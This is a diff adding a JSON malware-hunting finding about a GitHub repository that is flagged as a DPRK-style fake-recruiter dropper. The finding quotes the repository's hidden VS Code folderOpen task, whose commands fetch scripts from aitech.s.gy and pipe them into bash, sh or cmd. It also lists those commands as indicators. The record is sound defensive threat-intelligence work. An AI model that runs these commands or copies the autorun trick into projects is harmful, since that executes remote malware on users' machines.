@@ -1,0 +1,68 @@
+{
+  "finding": {
+    "key": "repository:ai-tech-vision/acnplay-demo",
+    "kind": "repository",
+    "family": "",
+    "id": "ai-tech-vision/acnplay-demo",
+    "url": "https://github.com/ai-tech-vision/ACNPlay-Demo/",
+    "registry": "github",
+    "owner": "ai-tech-vision",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 9,
+    "detection_method": "osm_repository",
+    "attribution": "dprk (north korea)",
+    "campaign_id": "",
+    "rules": "install_hook/vscode-autorun; obfuscation/atob",
+    "evidence_locations": ".vscode/tasks.json:0; controllers/auth.js:57",
+    "c2_hosts": "aitech.s.gy",
+    "iocs": "aitech.s.gy; https://aitech.s.gy/mac; https://aitech.s.gy/linux; https://aitech.s.gy/windows; curl -L 'https://aitech.s.gy/mac' | bash; .vscode/tasks.json",
+    "matched_signatures": "",
+    "reasons": "OSM-flagged malicious repository (severity CRITICAL) [DPRK (North Korea) (per OSM)]: DPRK Contagious Interview campaign using VS Code tasks.json. Auto-executes malicious payload when VS Code opens folder via runOn: folderOpen trigger or .githook | Tier-2 confirmed (bash score 9)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260707T021635Z",
+    "last_seen": "hunt-20260707T021635Z",
+    "evidence_file": "repositories/ai-tech-vision_acnplay-demo.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl -L 'https://aitech.s.gy/mac' | bash wget -qO- 'https://aitech.s.gy/linux' | sh curl --ssl-no-revoke -L https://aitech.s.gy/windows | cmd"
+    },
+    {
+      "file": "controllers/auth.js",
+      "line": 57,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "const setApiKey = (s) => atob(s);"
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/ai-tech-vision/acnplay-demo",
+    "version_info": "all",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from aitech.s.gy and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: aitech.s.gy.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun; Corroboration (not counted toward attribution): OSM/news already names dprk (north korea).\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from aitech.s.gy and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: aitech.s.gy",
+    "publisher": "ai-tech-vision",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/ai-tech-vision/acnplay-demo/blob/HEAD/.vscode/tasks.json\nhttps://github.com/ai-tech-vision/acnplay-demo/blob/HEAD/controllers/auth.js#L57",
+    "verified_iocs": "aitech.s.gy\nhttps://aitech.s.gy/mac\nhttps://aitech.s.gy/linux\nhttps://aitech.s.gy/windows\ncurl -L 'https://aitech.s.gy/mac' | bash\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-07-07T02:16:35Z",
+    "last_seen": "2026-07-07T02:16:35Z"
+  }
+}
